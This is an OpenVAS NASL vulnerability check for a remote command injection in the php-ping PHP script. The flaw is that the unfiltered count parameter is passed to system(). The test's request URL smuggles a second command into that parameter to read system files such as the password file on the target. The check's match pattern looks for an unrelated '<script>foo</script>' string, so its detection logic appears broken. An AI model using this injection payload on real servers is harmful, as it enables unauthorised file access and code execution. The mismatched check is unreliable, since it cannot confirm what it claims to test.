###############################################################################
# OpenVAS Vulnerability Test
# $Id: php_ping_code_execution.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Remote Code Execution in PHP Ping
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2003 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# From: ppp-design [security@ppp-design.de]
# Subject: php-ping: Executing arbitrary commands
# Date: Monday 29/12/2003 16:51

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11966");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(9309);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_name("Remote Code Execution in PHP Ping");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2003 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"php-ping is a simple php script executing the 'ping' command.

  A bug in this script allows users to execute arbitrary commands. The problem is based upon the
  fact that not all user inputs are filtered correctly: although $host is filtered using
  preg_replace(), the $count variable is passed unfiltered to the system() command.");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files( "linux" );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  foreach file( keys( files ) ) {

    if( dir == "/" ) dir = "";
    url = dir + "/php-ping.php?count=1+%26+cat%20/" + files[file] + "+%26&submit=Ping%21";

    if( http_vuln_check( port:port, url:url, check_header:TRUE, pattern:'value=""><script>foo</script>"' ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );